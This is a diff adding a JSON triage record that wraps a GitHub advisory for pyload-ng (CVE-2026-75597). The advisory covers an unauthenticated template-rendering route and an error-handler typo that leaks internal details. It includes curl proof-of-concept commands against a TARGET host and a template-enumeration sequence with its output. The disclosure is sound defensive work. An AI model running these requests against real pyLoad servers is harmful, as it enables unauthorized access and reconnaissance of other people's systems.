@@ -1,0 +1,59 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"comments\": 2, \"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/77918893?v=4\", \"events_url\": \"https://api.github.com/users/Razzkr/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/Razzkr/followers\", \"following_url\": \"https://api.github.com/users/Razzkr/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/Razzkr/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/Razzkr\", \"id\": 77918893, \"login\": \"Razzkr\", \"node_id\": \"MDQ6VXNlcjc3OTE4ODkz\", \"organizations_url\": \"https://api.github.com/users/Razzkr/orgs\", \"received_events_url\": \"https://api.github.com/users/Razzkr/received_events\", \"repos_url\": \"https://api.github.com/users/Razzkr/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/Razzkr/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/Razzkr/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/Razzkr\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-75597\", \"cvss\": {\"score\": 5.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 5.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-209\", \"name\": \"Generation of Error Message Containing Sensitive Information\"}, {\"cwe_id\": \"CWE-306\", \"name\": \"Missing Authentication for Critical Function\"}], \"description\": \"### Summary\\n\\nThe `/web/<path:filename>` route in `src/pyload/webui/app/blueprints/app_blueprint.py` renders Jinja2 templates without any authentication requirement. Every equivalent direct route (`/logs`, `/settings`, `/queue`, `/dashboard`, etc.) is protected by `@login_required`, but the underlying templates for all of these pages are accessible unauthenticated via this endpoint. Combined with an exception attribute typo in `src/pyload/webui/app/handlers.py` (`exc.desc` instead of `exc.description`), internal Jinja2 variable names are leaked in HTTP 500 response bodies to unauthenticated callers. An attacker can also enumerate all valid template names by observing 200 vs 500 response differentiation.\\n\\n### Details\\n\\n**Bug 1 — Missing authentication on `/web/<path:filename>`**\\n\\nFile: `src/pyload/webui/app/blueprints/app_blueprint.py`, lines 32–36\\n\\n```python\\n@bp.route(\\\"/web/<path:filename>\\\", endpoint=\\\"web\\\")\\ndef render(filename):                          # ← no @login_required\\n    mimetype = mimetypes.guess_type(filename)[0] or \\\"text/html\\\"\\n    data = render_template(filename)\\n    return flask.Response(data, mimetype=mimetype)\\n```\\n\\nEvery other sensitive route in the same file is protected:\\n\\n```python\\n@bp.route(\\\"/logs\\\", ...)\\n@login_required(\\\"LIST\\\")       # protected\\n\\n@bp.route(\\\"/settings\\\", ...)\\n@login_required(\\\"SETTINGS\\\")  # protected\\n\\n@bp.route(\\\"/files\\\", ...)\\n@login_required(\\\"DOWNLOAD\\\")  # protected\\n```\\n\\nThe `/web/<path:filename>` route has no such decorator, allowing any unauthenticated HTTP client to render arbitrary templates by supplying their filename in the URL path.\\n\\n**Bug 2 — Exception attribute typo causes internal details in error responses**\\n\\nFile: `src/pyload/webui/app/handlers.py`, lines 12–20\\n\\n```python\\ndef handle_exception_error(exc):\\n    try:\\n        code = exc.code\\n        desc = exc.desc          # BUG: attribute does not exist on standard exceptions\\n    except AttributeError:       # always raised — falls here for every exception\\n        code = 500\\n        desc = exc               # raw exception object assigned to desc\\n    message = f\\\"Error {code}: {desc}\\\"   # str(exc) embedded in response body\\n    return render_template(\\\"error.html\\\", messages=[message]), code\\n```\\n\\n`exc.desc` does not exist on standard Python or Jinja2 exceptions. The `AttributeError` branch is always taken for template rendering failures. `desc` is set to the raw exception object, and `str(exc)` is embedded in the HTML response body returned to the unauthenticated caller. For a `UndefinedError` this produces `'conf' is undefined`. For `TemplateNotFound` it produces the template filename.\\n\\n### PoC\\n\\nTested against pyload-ng develop branch (`0.5.0b3.dev`), default install, no authentication cookies or credentials used in any request.\\n\\n**Test 1 — Unauthenticated page render confirmed (HTTP 200)**\\n```bash\\ncurl -si http://TARGET:8000/web/logs.html | grep \\\"HTTP\\\\|title\\\"\\n\\n```\\n\\nTest 2 — System info page with sensitive field labels rendered unauthenticated\\n```curl -s http://TARGET:8000/web/info.html | grep \\\"Python Version\\\\|Installation Folder\\\\|Config Folder\\\\|OS Platform\\\"\\nhtml\\n\\n<dt><b>Python Version:</b></dt>\\n<dt><b>OS Platform:</b></dt>\\n<dt><b>Installation Folder:</b></dt>\\n<dt><b>Config Folder:</b></dt>```\\n\\nTest 3 — Internal Jinja2 variable name leaked in HTTP 500 body (unauthenticated)\\n```curl -si http://TARGET:8000/web/settings.html | grep \\\"HTTP\\\\|Error\\\"\\nHTTP/1.1 500 INTERNAL SERVER ERROR\\n<p><b>Error 500: 'conf' is undefined</b></p>```\\nTest 4 — Template enumeration via response code differentiation\\n```curl -o /dev/null -sw \\\"%{http_code}\\\\n\\\" http://TARGET:8000/web/logs.html\\ncurl -o /dev/null -sw \\\"%{http_code}\\\\n\\\" http://TARGET:8000/web/info.html\\ncurl -o /dev/null -sw \\\"%{http_code}\\\\n\\\" http://TARGET:8000/web/dashboard.html\\ncurl -o /dev/null -sw \\\"%{http_code}\\\\n\\\" http://TARGET:8000/web/settings.html\\ncurl -o /dev/null -sw \\\"%{http_code}\\\\n\\\" http://TARGET:8000/web/queue.html\\ncurl -o /dev/null -sw \\\"%{http_code}\\\\n\\\" http://TARGET:8000/web/collector.html\\ncurl -o /dev/null -sw \\\"%{http_code}\\\\n\\\" http://TARGET:8000/web/filemanager.html\\ncurl -o /dev/null -sw \\\"%{http_code}\\\\n\\\" http://TARGET:8000/web/nonexistent_xyz.html\\n200  ← logs.html        (exists, renders without auth)\\n200  ← info.html        (exists, renders without auth)\\n200  ← dashboard.html   (exists, renders without auth)\\n500  ← settings.html    (exists, missing auth context — leaks 'conf' is undefined)\\n500  ← queue.html       (exists, missing auth context)\\n500  ← collector.html   (exists, missing auth context)\\n500  ← filemanager.html (exists, missing auth context)\\n500  ← nonexistent_xyz  (does not exist — same 500, no differentiation on miss)```\\n\\n###Impact\\nAn unauthenticated remote attacker can:\\n\\nRender application page templates without any credentials, bypassing the access control model enforced on all direct routes\\nAccess the system information page (info.html) exposing field structure for Python version, OS platform, pyLoad version, installation folder, config folder, and WebUI port — values are populated via JS but field labels confirm application structure\\nAccess the full log viewer UI (logs.html) and download dashboard (dashboard.html) without authentication\\nExtract internal Jinja2 template variable names from HTTP 500 response bodies ('conf' is undefined, etc.)\\nEnumerate all valid template filenames by observing 200 vs 500 response codes\\n\\nThe access control inconsistency is the core issue: the authentication model enforced on direct routes is completely bypassed via the /web/<path:filename> endpoint. Any future template that renders sensitive data server-side would be immediately exposed to unauthenticated access through this route.\", \"ghsa_id\": \"GHSA-j92p-c242-7hfx\", \"github_reviewed_at\": \"2026-10-09T16:40:30Z\", \"html_url\": \"https://github.com/advisories/GHSA-j92p-c242-7hfx\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-j92p-c242-7hfx\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-75597\"}], \"nvd_published_at\": null, \"published_at\": \"2026-10-09T16:40:30Z\", \"references\": [\"https://github.com/pyload/pyload/security/advisories/GHSA-j92p-c242-7hfx\", \"https://github.com/pyload/pyload/commit/e80c940cd604e60d93e3164429d4fc4aac54468d\", \"https://github.com/advisories/GHSA-j92p-c242-7hfx\"], \"repository_advisory_url\": \"https://api.github.com/repos/pyload/pyload/security-advisories/GHSA-j92p-c242-7hfx\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/pyload/pyload\", \"summary\": \"pyLoad: Unauthenticated access to /web/<path:filename> bypasses authentication on sensitive templates and leaks internal error details via exception attribute typo\", \"type\": \"reviewed\", \"updated_at\": \"2026-10-09T16:40:31Z\", \"url\": \"https://api.github.com/advisories/GHSA-j92p-c242-7hfx\", \"vulnerabilities\": [{\"first_patched_version\": \"0.5.0b3.dev101\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"pyload-ng\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 0.5.0b3.dev100\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-j92p-c242-7hfx",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_entries": {},
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "pyload-ng: <= 0.5.0b3.dev100"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-75597"
+    ],
+    "cvss_score": 5.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "pyload-ng"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-10-09T19:14:15.302425Z",
+  "provenance": {
+    "content_sha256": "fc884d9fc7dcaf33a00a4aac4d1938217697c73306c7ff308fb860666392f330",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-10-09T16:40:30Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-j92p-c242-7hfx",
+  "status": "active",
+  "title": "pyLoad: Unauthenticated access to /web/<path:filename> bypasses authentication on sensitive templates and leaks internal error details via exception attribute typo",
+  "updated_at": "2026-10-09T16:40:31Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-j92p-c242-7hfx"
+}
